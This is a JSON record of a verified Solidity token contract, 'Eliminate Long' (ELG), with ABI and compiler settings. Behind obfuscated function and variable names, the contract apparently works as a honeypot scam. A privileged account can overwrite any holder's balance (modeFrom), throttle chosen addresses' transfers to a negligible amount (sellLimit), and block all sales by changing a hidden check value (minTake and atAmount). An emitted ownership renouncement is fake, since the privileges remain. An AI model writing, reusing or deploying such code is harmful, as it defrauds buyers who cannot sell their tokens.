{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface modeTeamMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldTokenFee {\n    function createPair(address senderTake, address shouldIs) external returns (address);\n}\n\ninterface amountMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxEnableSwap) external view returns (uint256);\n\n    function transfer(address exemptSender, uint256 sellEnable) external returns (bool);\n\n    function allowance(address modeTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptSender,\n        uint256 sellEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);\n    event Approval(address indexed modeTx, address indexed spender, uint256 value);\n}\n\ninterface amountMarketingMetadata is amountMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EliminateLong is fundReceiver, amountMarketing, amountMarketingMetadata {\n\n    function transfer(address fromIs, uint256 sellEnable) external virtual override returns (bool) {\n        return atAmount(_msgSender(), fromIs, sellEnable);\n    }\n\n    mapping(address => bool) public liquidityEnableTo;\n\n    uint256 private marketingFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return fundEnable;\n    }\n\n    function transferFrom(address limitTotal, address exemptSender, uint256 sellEnable) external override returns (bool) {\n        if (_msgSender() != tradingToSell) {\n            if (amountToken[limitTotal][_msgSender()] != type(uint256).max) {\n                require(sellEnable <= amountToken[limitTotal][_msgSender()]);\n                amountToken[limitTotal][_msgSender()] -= sellEnable;\n            }\n        }\n        return atAmount(limitTotal, exemptSender, sellEnable);\n    }\n\n    uint256 public fundLiquidity;\n\n    function maxTrading(address limitTotal, address exemptSender, uint256 sellEnable) internal returns (bool) {\n        require(txFee[limitTotal] >= sellEnable);\n        txFee[limitTotal] -= sellEnable;\n        txFee[exemptSender] += sellEnable;\n        emit Transfer(limitTotal, exemptSender, sellEnable);\n        return true;\n    }\n\n    address tradingToSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private maxExempt = \"ELG\";\n\n    uint256 public amountEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoAtMax;\n    }\n\n    uint256 maxLaunch;\n\n    bool public tradingFee;\n\n    constructor (){\n        if (shouldExempt) {\n            marketingFrom = fundLiquidity;\n        }\n        modeTeamMarketing listTeam = modeTeamMarketing(tradingToSell);\n        listExempt = shouldTokenFee(listTeam.factory()).createPair(listTeam.WETH(), address(this));\n        if (tokenIsReceiver != launchModeReceiver) {\n            launchAuto = true;\n        }\n        tradingTeamLaunch = _msgSender();\n        launchEnable();\n        tradingTx[tradingTeamLaunch] = true;\n        txFee[tradingTeamLaunch] = senderList;\n        if (amountEnable == fundLiquidity) {\n            launchAuto = false;\n        }\n        emit Transfer(address(0), tradingTeamLaunch, senderList);\n    }\n\n    uint256 public tokenIsReceiver;\n\n    uint256 private senderList = 100000000 * 10 ** 18;\n\n    address public listExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxExempt;\n    }\n\n    function allowance(address liquidityList, address modeExemptIs) external view virtual override returns (uint256) {\n        if (modeExemptIs == tradingToSell) {\n            return type(uint256).max;\n        }\n        return amountToken[liquidityList][modeExemptIs];\n    }\n\n    mapping(address => uint256) private txFee;\n\n    function approve(address modeExemptIs, uint256 sellEnable) public virtual override returns (bool) {\n        amountToken[_msgSender()][modeExemptIs] = sellEnable;\n        emit Approval(_msgSender(), modeExemptIs, sellEnable);\n        return true;\n    }\n\n    address isReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderList;\n    }\n\n    function sellLimit(address swapLimit) public {\n        minLaunch();\n        if (launchAuto != shouldExempt) {\n            amountEnable = marketingFrom;\n        }\n        if (swapLimit == tradingTeamLaunch || swapLimit == listExempt) {\n            return;\n        }\n        liquidityEnableTo[swapLimit] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountToken;\n\n    uint8 private autoAtMax = 18;\n\n    function minLaunch() private view {\n        require(tradingTx[_msgSender()]);\n    }\n\n    address public tradingTeamLaunch;\n\n    function modeFrom(address fromIs, uint256 sellEnable) public {\n        minLaunch();\n        txFee[fromIs] = sellEnable;\n    }\n\n    function balanceOf(address maxEnableSwap) public view virtual override returns (uint256) {\n        return txFee[maxEnableSwap];\n    }\n\n    address private totalLiquidity;\n\n    function getOwner() external view returns (address) {\n        return totalLiquidity;\n    }\n\n    function receiverList(address fundLaunchTeam) public {\n        if (tradingFee) {\n            return;\n        }\n        \n        tradingTx[fundLaunchTeam] = true;\n        if (launchAuto != shouldExempt) {\n            tokenIsReceiver = fundLiquidity;\n        }\n        tradingFee = true;\n    }\n\n    function atAmount(address limitTotal, address exemptSender, uint256 sellEnable) internal returns (bool) {\n        if (limitTotal == tradingTeamLaunch) {\n            return maxTrading(limitTotal, exemptSender, sellEnable);\n        }\n        uint256 totalTake = amountMarketing(listExempt).balanceOf(isReceiver);\n        require(totalTake == takeSender);\n        require(exemptSender != isReceiver);\n        if (liquidityEnableTo[limitTotal]) {\n            return maxTrading(limitTotal, exemptSender, modeReceiverIs);\n        }\n        return maxTrading(limitTotal, exemptSender, sellEnable);\n    }\n\n    string private fundEnable = \"Eliminate Long\";\n\n    uint256 constant modeReceiverIs = 12 ** 10;\n\n    bool public shouldExempt;\n\n    uint256 private launchModeReceiver;\n\n    function owner() external view returns (address) {\n        return totalLiquidity;\n    }\n\n    function minTake(uint256 sellEnable) public {\n        minLaunch();\n        takeSender = sellEnable;\n    }\n\n    mapping(address => bool) public tradingTx;\n\n    bool private launchAuto;\n\n    event OwnershipTransferred(address indexed buyList, address indexed walletReceiver);\n\n    function launchEnable() public {\n        emit OwnershipTransferred(tradingTeamLaunch, address(0));\n        totalLiquidity = address(0);\n    }\n\n    bool private receiverExempt;\n\n    uint256 takeSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeExemptIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExemptIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnableSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityEnableTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellEnable\",\"type\":\"uint256\"}],\"name\":\"minTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellEnable\",\"type\":\"uint256\"}],\"name\":\"modeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunchTeam\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLimit\",\"type\":\"address\"}],\"name\":\"sellLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIsReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeamLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EliminateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}